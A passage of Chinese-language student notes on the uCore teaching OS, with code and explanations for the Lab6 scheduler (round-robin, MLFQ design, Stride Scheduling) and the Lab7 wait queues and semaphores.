class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">schedule</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">next</span>;</span><br>    local_intr_save(intr_flag);  <span class="hljs-comment">//inhibit interrupt</span><br>    &#123;<br>        current-&gt;need_resched = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (current-&gt;state == PROC_RUNNABLE) &#123;<br>            <span class="hljs-comment">//change from list search to function</span><br>            sched_class_enqueue(current);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((next = sched_class_pick_next()) != <span class="hljs-literal">NULL</span>) &#123;<br>            sched_class_dequeue(next);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (next == <span class="hljs-literal">NULL</span>) &#123;<br>            next = idleproc;<br>        &#125;<br>        next-&gt;runs ++;<br>        <span class="hljs-keyword">if</span> (next != current) &#123;<br>            proc_run(next);<br>        &#125;<br>    &#125;<br>    local_intr_restore(intr_flag);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>首先是schedule函数, 他被调用的函数在下表:</p><table><thead><tr><th>编号</th><th>位置</th><th>原因</th></tr></thead><tbody><tr><td>1</td><td>proc.c::do_exit</td><td>用户线程执行结束，主动放弃CPU控制权。</td></tr><tr><td>2</td><td>proc.c::do_wait</td><td>用户线程等待子进程结束，主动放弃CPU控制权。</td></tr><tr><td>3</td><td>proc.c::init_main</td><td>1. initproc内核线程等待所有用户进程结束，如果没有结束，就主动放弃CPU控制权; 2. initproc内核线程在所有用户进程结束后，让kswapd内核线程执行10次，用于回收空闲内存资源</td></tr><tr><td>4</td><td>proc.c::cpu_idle</td><td>idleproc内核线程的工作就是等待有处于就绪态的进程或线程，如果有就调用schedule函数</td></tr><tr><td>5</td><td>sync.h::lock</td><td>在获取锁的过程中，如果无法得到锁，则主动放弃CPU控制权</td></tr><tr><td>6</td><td>trap.c::trap</td><td>如果在当前进程在用户态被打断去，且当前进程控制块的成员变量need_resched设置为1，则当前线程会放弃CPU控制权(<strong>这个感觉挺特别的, 如果需要被调度, 那么只要因为个什么软中断跳转到内核状态进行执行的时候就会放弃控制权. 这实际上体现了对用户进程的可抢占性, 而且是随机抢占</strong>)</td></tr></tbody></table><p>选取下一个完成之后, next变量作为proc_run()的参数进而执行next中的进程.</p><ul><li>请在实验报告中简要说明如何设计实现”多级反馈队列调度算法“，给出概要设计，鼓励给出详细设计</li></ul><p><strong>多级反馈队列算法（MLFQ)</strong> </p><p>进程可<strong>在不同队列间移动</strong>的多级队列算法, 时间片大小随优先级级别的增加而增加,<br>例如进程在当前时间片内没有完成，则降到下一个优先级。</p><p>特征：CPU密集型进程优先级下降的很快，IO密集型进程停留在高优先级</p><p><strong>大概设计:</strong> </p><p>多级反馈队列要有多个<code>run_queue</code>, 每个queue的时间片不同.</p><blockquote><p>假设有三个run_queue, rq0, rq1, rq2, 固定时间片为5, 队列间调度使用RR算法, 时间片长度为10, 8, 6</p></blockquote><ul><li><p>sched_init(): 首先list_init()一下三个rq, 将函数指针结构体赋值一下, 设置当前rq=rq0</p></li><li><p>sched_class_proc_tick: 在时钟中断里被调用, 如果当前时间片用完了, 则设置need_resched为1</p></li><li><p>sched_pick_next: 判断当前queue时间片以及当前进程时间片是否用完, 前者用完则rq切换到下一个queue, 后者用完rq不变, 从rq取出第一个进程</p></li><li><p>sched_enqueue: 通过run_times判断为CPU密集或者IO密集, 通过设定阈值来加入到三个不同的queue中</p></li><li><p>sched_dequeue: delete就完事了</p></li></ul><h3 id="练习2-3"><a href="#练习2-3" class="headerlink" title="练习2"></a>练习2</h3><p><a href="http://www.waldspurger.org/carl/papers/phd-mit-tr667.pdf">Lottery and Stride算法论文</a> | <a href="https://people.cs.umass.edu/~mcorner/courses/691J/papers/PS/waldspurger_stride/waldspurger95stride.pdf">节选重要的部分</a> </p><p>uCore的Round-Robin算法可以保证每个进程得到的CPU资源是相等的，但我们希望调度器能够更加智能的为每个进程分配合理的CPU资源，让<strong>每个进程得到的时间资源与它们的优先级成正比关系</strong>。而Stride Scheduling调度算法就是这样的一种典型而简单的算法。</p><p>其中，该算法的有如下几个特点：</p><ul><li>实现简单</li><li>可控性：可以证明Stride Scheduling对进程的调度次数正比于其优先级</li><li>确定性：在不考虑计时器事件的情况下，整个调度机制都是可预知和重现的。</li></ul><p>而该算法的基本思想如下：</p><ol><li>为每个runnable的进程设置一个当前状态stride，表示该进程当前的调度权。另外定义其对应的pass值，表示对应进程在调度后，stride 需要进行的累加值。</li><li>每次需要调度时，从当前 runnable 态的进程中选择 stride最小的进程调度。</li><li>对于获得调度的进程P，将对应的stride加上其对应的步长pass（只与进程的优先权有关系）。</li><li>在一段固定的时间之后，回到 2.步骤，重新调度当前stride最小的进程。</li></ol><blockquote><p>可以证明，如果令 P.pass = BigStride / P.priority 其中 P.priority 表示进程的优先权（大于 1），而 BigStride 表示一个预先定义的大常数，则该调度方案为每个进程分配的时间将与其优先级成正比。</p></blockquote><p>代码:</p><ul><li><p><code>stride_init</code> </p><p>lab6_run_pool就是一个ucore库自带的一个heap实现, 一开始置空. 后面的增删操作都是使用已经提供的接口.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stride_init</span><span class="hljs-params">(struct run_queue *rq)</span> </span>&#123;<br>    list_init(&amp;(rq-&gt;run_list));<br>    <span class="hljs-comment">// 这里不能使用skew_heap_init(rq-&gt;lab6_run_pool)</span><br>    rq-&gt;lab6_run_pool = <span class="hljs-literal">NULL</span>;<br>    rq-&gt;proc_num = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p><code>stride_enqueue</code> + <code>stride_dequeue</code> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stride_enqueue</span><span class="hljs-params">(struct run_queue *rq, struct proc_struct *proc)</span> </span>&#123;<br>    <span class="hljs-comment">//insert函数返回heap的顶端, 用来更新lab6_run_pool</span><br>    rq-&gt;lab6_run_pool = skew_heap_insert(rq-&gt;lab6_run_pool, &amp;(proc-&gt;lab6_run_pool), proc_stride_comp_f);<br>    <span class="hljs-comment">//不知道什么时候会变成大于max, 估计是溢出</span><br>    <span class="hljs-keyword">if</span> (proc-&gt;time_slice == <span class="hljs-number">0</span> || proc-&gt;time_slice &gt; rq-&gt;max_time_slice) &#123;<br>        proc-&gt;time_slice = rq-&gt;max_time_slice;<br>    &#125;<br>    proc-&gt;rq = rq;<br>    rq-&gt;proc_num ++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stride_dequeue</span><span class="hljs-params">(struct run_queue *rq, struct proc_struct *proc)</span> </span>&#123;<br>    rq-&gt;lab6_run_pool = skew_heap_remove(rq-&gt;lab6_run_pool, &amp;(proc-&gt;lab6_run_pool), proc_stride_comp_f);<br>    rq-&gt;proc_num --;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p><code>pick_next</code> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">proc_stride_comp_f</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *a, <span class="hljs-keyword">void</span> *b)</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">p</span> =</span> le2proc(a, lab6_run_pool);<br>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">q</span> =</span> le2proc(b, lab6_run_pool);<br>     <span class="hljs-keyword">int32_t</span> c = p-&gt;lab6_stride - q-&gt;lab6_stride;<br>     <span class="hljs-keyword">if</span> (c &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>     <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>     <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> struct proc_struct *</span><br><span class="hljs-function"><span class="hljs-title">stride_pick_next</span><span class="hljs-params">(struct run_queue *rq)</span> </span>&#123;<br>    <span class="hljs-keyword">skew_heap_entry_t</span>* she = rq-&gt;lab6_run_pool;<br>    <span class="hljs-keyword">if</span> (she != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span>* <span class="hljs-title">p</span> =</span> le2proc(she, lab6_run_pool);<br>        p-&gt;lab6_stride += BIG_STRIDE / p-&gt;lab6_priority;<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p><code>stride_proc_tick</code> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stride_proc_tick</span><span class="hljs-params">(struct run_queue *rq, struct proc_struct *proc)</span> </span>&#123;<br>     <span class="hljs-keyword">if</span> (proc-&gt;time_slice &gt; <span class="hljs-number">0</span>) &#123;<br>        proc-&gt;time_slice --;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (proc-&gt;time_slice == <span class="hljs-number">0</span>) &#123;<br>        proc-&gt;need_resched = <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="Challenge-1-1"><a href="#Challenge-1-1" class="headerlink" title="Challenge 1"></a>Challenge 1</h3><blockquote><p>实现 Linux 的 CFS 调度算法 <a href="https://developer.ibm.com/tutorials/l-completely-fair-scheduler/">link</a> | <a href="https://cs334.cs.vassar.edu/slides/04_Linux_CFS.pdf">和nice的关系</a> </p></blockquote><p>Completely Fair Scheduling, which is self-explanatory, is to maintain balance (fairness) in providing processor time to tasks.</p><h1 id="Lab7"><a href="#Lab7" class="headerlink" title="Lab7"></a>Lab7</h1><h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2><h3 id="00-基础原理"><a href="#00-基础原理" class="headerlink" title="00.基础原理"></a>00.<a href="https://kiprey.github.io/2020/09/uCore-7/#%E7%9F%A5%E8%AF%86%E7%82%B9">基础原理</a></h3><h3 id="0-项目组成-3"><a href="#0-项目组成-3" class="headerlink" title="0.项目组成"></a>0.项目组成</h3><ul><li>kern/schedule/{sched.h,sched.c}: 增加了定时器（timer）机制，用于进程/线程的do_sleep功能。</li><li>kern/sync/sync.h: <strong>去除了lock实现（这对于不抢占内核没用。</strong> </li><li>kern/sync/wait.[ch]: 定义了等待队列wait_queue结构和等待entry的wait结构以及在此之上的函数，这是ucore中的信号量semophore机制和条件变量机制的基础，在本次实验中你需要了解其实现。</li><li>kern/sync/sem.[ch]:定义并实现了ucore中内核级信号量相关的数据结构和函数，本次试验中你需要了解其中的实现，并基于此完成内核级条件变量的设计与实现。</li><li>user/ libs/ {syscall.[ch],ulib.[ch] }与kern/sync/syscall.c：实现了进程sleep相关的系统调用的参数传递和调用关系。</li><li>user/{ sleep.c,sleepkill.c}: 进程睡眠相关的一些测试用户程序。</li><li>kern/sync/monitor.[ch]:基于管程的条件变量的实现程序，在本次实验中是练习的一部分，要求完成。</li><li>kern/sync/check_sync.c：实现了基于管程的哲学家就餐问题，在本次实验中是练习的一部分，要求完成基于管程的哲学家就餐问题。</li><li>kern/mm/vmm.[ch]：用信号量mm_sem取代mm_struct中原有的mm_lock。（本次实验不用管）</li></ul><h3 id="1-定时器相关"><a href="#1-定时器相关" class="headerlink" title="1.定时器相关"></a>1.定时器相关</h3><p>在<code>sched.h</code>中定义了定时器中断相关的函数:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sched_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wakeup_proc</span><span class="hljs-params">(struct proc_struct *proc)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">schedule</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add_timer</span><span class="hljs-params">(<span class="hljs-keyword">timer_t</span> *timer)</span></span>;     <span class="hljs-comment">// add timer to timer_list</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">del_timer</span><span class="hljs-params">(<span class="hljs-keyword">timer_t</span> *timer)</span></span>;     <span class="hljs-comment">// del timer from timer_list</span><br><span class="hljs-comment">// call scheduler to update tick related info, and check the timer is expired? If expired, then wakup proc</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">run_timer_list</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br></code></pre></div></td></tr></table></figure><p>add_timer函数只在do_sleep中会被用到, 用于设定sleep的时长, 然后通过时钟中断里的run_timer_lsit来找到expired的进程, 从而继续执行.</p><h3 id="2-等待队列实现"><a href="#2-等待队列实现" class="headerlink" title="2.等待队列实现"></a>2.等待队列实现</h3><h4 id="基本结构和函数"><a href="#基本结构和函数" class="headerlink" title="基本结构和函数"></a>基本结构和函数</h4><p>需要等待事件的进程在转入休眠状态后插入到等待队列中。当事件发生之后，内核遍历相应等待队列，唤醒休眠的用户进程或内核线程，并设置其状态为就绪状态（PROC_RUNNABLE），并将该进程从等待队列中清除。ucore在kern/sync/{ wait.h, wait.c }中实现了等待项wait结构和等待队列wait queue结构以及相关函数），这是实现ucore中的信号量机制和条件变量机制的基础</p><blockquote><p>总结一下, 到目前为止出现了几个queue, 一个是放着所有进程的proc_list, 用于get_pid(), kern_thread()等等函数; 第二个是<code>struct run_queue *rq</code>, 即运行队列, 当然不仅仅只是一个链表头, 也可以是heap的head; 第三个是这里的等待队列wait_queue, 实现在下面:</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-string">&quot;数据结构&quot;</span><br><span class="hljs-keyword">typedef</span>  <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span>     <span class="hljs-comment">//等待进程的指针</span><br>    <span class="hljs-keyword">uint32_t</span> wakeup_flags;        <span class="hljs-comment">//进程被放入等待队列的原因标记</span><br>    <span class="hljs-keyword">wait_queue_t</span> *wait_queue;     <span class="hljs-comment">//指向此wait结构所属于的wait_queue</span><br>    <span class="hljs-keyword">list_entry_t</span> wait_link;       <span class="hljs-comment">//用来组织wait_queue中wait节点的连接</span><br>&#125; <span class="hljs-keyword">wait_t</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-keyword">list_entry_t</span> wait_head;       <span class="hljs-comment">//wait_queue的队头</span><br>&#125; <span class="hljs-keyword">wait_queue_t</span>;<br><br>le2wait(le, member)               <span class="hljs-comment">//实现wait_t中成员的指针向wait_t 指针的转化</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-string">&quot;底层相关函数, 定义queue级别的操作, wakeup等操作是由高层函数实现的&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_init</span><span class="hljs-params">(<span class="hljs-keyword">wait_t</span> *wait, struct proc_struct *proc)</span></span>;    <span class="hljs-comment">//初始化wait结构</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">wait_in_queue</span><span class="hljs-params">(<span class="hljs-keyword">wait_t</span> *wait)</span></span>;                          <span class="hljs-comment">//wait是否在wait queue中</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_queue_init</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>)</span></span>;                 <span class="hljs-comment">//初始化wait_queue结构</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_queue_add</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait)</span></span>;    <span class="hljs-comment">//把wait前插到wait queue中</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_queue_del</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait)</span></span>;    <span class="hljs-comment">//从wait queue中删除wait</span><br><span class="hljs-comment">//下两个参数中的queue用于assert检查</span><br><span class="hljs-function"><span class="hljs-keyword">wait_t</span> *<span class="hljs-title">wait_queue_next</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait)</span></span>;<span class="hljs-comment">//取得wait的后一个链接指针</span><br><span class="hljs-function"><span class="hljs-keyword">wait_t</span> *<span class="hljs-title">wait_queue_prev</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait)</span></span>;<span class="hljs-comment">//取得wait的前一个链接指针</span><br><span class="hljs-function"><span class="hljs-keyword">wait_t</span> *<span class="hljs-title">wait_queue_first</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>)</span></span>;             <span class="hljs-comment">//取得wait queue的第一个wait</span><br><span class="hljs-function"><span class="hljs-keyword">wait_t</span> *<span class="hljs-title">wait_queue_last</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>)</span></span>;              <span class="hljs-comment">//取得wait queue的最后一个wait</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">wait_queue_empty</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>)</span></span>;                <span class="hljs-comment">//wait queue是否为空</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-string">&quot;高层函数&quot;</span><br><span class="hljs-comment">//让wait与进程关联，且让当前进程关联的wait进入等待队列queue，当前进程睡眠</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_current_set</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait, <span class="hljs-keyword">uint32_t</span> wait_state)</span></span>;<br><span class="hljs-comment">//把与当前进程关联的wait从等待队列queue中删除</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_current_del</span><span class="hljs-params">(<span class="hljs-built_in">queue</span>, wait)</span></span>;<br><span class="hljs-comment">//下面三个函数中的del是指是否删除</span><br><span class="hljs-comment">//唤醒与wait关联的进程, 调用wakeup_proc()-&gt;sche_class_enqueue()把proc加入到rq里</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wakeup_wait</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait, <span class="hljs-keyword">uint32_t</span> wakeup_flags, <span class="hljs-keyword">bool</span> del)</span></span>;<br><span class="hljs-comment">//唤醒等待队列上挂着的第一个wait所关联的进程</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wakeup_first</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">uint32_t</span> wakeup_flags, <span class="hljs-keyword">bool</span> del)</span></span>;<br><span class="hljs-comment">//唤醒等待队列上所有的等待的进程, 会调用wakeup_wait和wait_queue_first(next)</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wakeup_queue</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">uint32_t</span> wakeup_flags, <span class="hljs-keyword">bool</span> del)</span></span>;<br></code></pre></div></td></tr></table></figure><p>内核前面的流程还是一样的, 由proc_init()函数创建第一个内核进程idleproc, 然后调用kern_thread()创建第二个内核进程initproc, 这个进程会执行init_main函数. 但是一切都还未发生, 直到cpu_idle()函数发现当前(idleproc)的need_resched==1, 换成initproc开始执行, 在这个lab中init_main加上了check_sync()用来检查哲学家思考问题.</p><p>下面是调用关系示例:</p><h4 id="up-V操作"><a href="#up-V操作" class="headerlink" title="__up(): V操作"></a>__up(): V操作</h4><p><img src="../../image/ucore/up.gif" alt="up"></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> __noinline <span class="hljs-keyword">void</span> __up(<span class="hljs-keyword">semaphore_t</span> *sem, <span class="hljs-keyword">uint32_t</span> wait_state) &#123;<br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    local_intr_save(intr_flag);<br>    &#123;<span class="hljs-comment">//屏蔽中断</span><br>        <span class="hljs-keyword">wait_t</span> *wait;<br>        <span class="hljs-keyword">if</span> ((wait = wait_queue_first(&amp;(sem-&gt;wait_queue))) == <span class="hljs-literal">NULL</span>) <br>        &#123;<span class="hljs-comment">//意味着没有等待的进程</span><br>            sem-&gt;value ++;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//否则要唤醒</span><br>            wakeup_wait(&amp;(sem-&gt;wait_queue), wait, wait_state, <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    local_intr_restore(intr_flag);<br><br></code></pre></div></td></tr></table></figure><h4 id="down-P操作"><a href="#down-P操作" class="headerlink" title="__down(): P操作"></a>__down(): P操作</h4><p><img src="../../image/ucore/down.gif" alt="down"></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> __noinline <span class="hljs-keyword">uint32_t</span> __down(<span class="hljs-keyword">semaphore_t</span> *sem, <span class="hljs-keyword">uint32_t</span> wait_state) &#123;<br>    <span class="hljs-comment">//realize P operation</span><br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    local_intr_save(intr_flag);<span class="hljs-comment">//save the interrupt flag</span><br>    <span class="hljs-keyword">if</span> (sem-&gt;value &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">//能够获取信号量</span><br>        sem-&gt;value --;<br>        local_intr_restore(intr_flag);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">//无法获得信号量时:</span><br>    <span class="hljs-keyword">wait_t</span> __wait, *wait = &amp;__wait;<br>    wait_current_set(&amp;(sem-&gt;wait_queue), wait, wait_state); <span class="hljs-comment">//加入等待队列</span><br>    local_intr_restore(intr_flag);<span class="hljs-comment">//关中断</span><br><br>    schedule();<span class="hljs-comment">//选择另一个进程执行</span><br><br>    local_intr_save(intr_flag);<span class="hljs-comment">//如果被另一个V操作(up函数)唤醒, 继续执行</span><br>    wait_current_del(&amp;(sem-&gt;wait_queue), wait);<span class="hljs-comment">//从wait队列中删除</span><br>    local_intr_restore(intr_flag);<br><br>    <span class="hljs-keyword">if</span> (wait-&gt;wakeup_flags != wait_state) &#123;<br>        <span class="hljs-keyword">return</span> wait-&gt;wakeup_flags;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-信号量"><a href="#3-信号量" class="headerlink" title="3.信号量"></a>3.信号量</h3><p>信号量的数据结构定义如下:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-keyword">int</span> value;                   <span class="hljs-comment">//信号量的当前值</span><br>    <span class="hljs-keyword">wait_queue_t</span> wait_queue;     <span class="hljs-comment">//信号量对应的等待队列</span><br>&#125; <span class="hljs-keyword">semaphore_t</span>;<br></code></pre></div></td></tr></table></figure><p>__up()和__down()的分析在上面.</p><p>对照信号量的原理性描述和具体实现，可以发现二者在流程上基本一致，只是具体实现采用了关中断的方式保证了对共享资源的互斥访问，通过等待队列让无法获得信号量的进程睡眠等待。</p><h3 id="4-管程-monitor-和条件变量"><a href="#4-管程-monitor-和条件变量" class="headerlink" title="4.管程(monitor)和条件变量"></a>4.管程(monitor)和条件变量</h3><blockquote><p><a 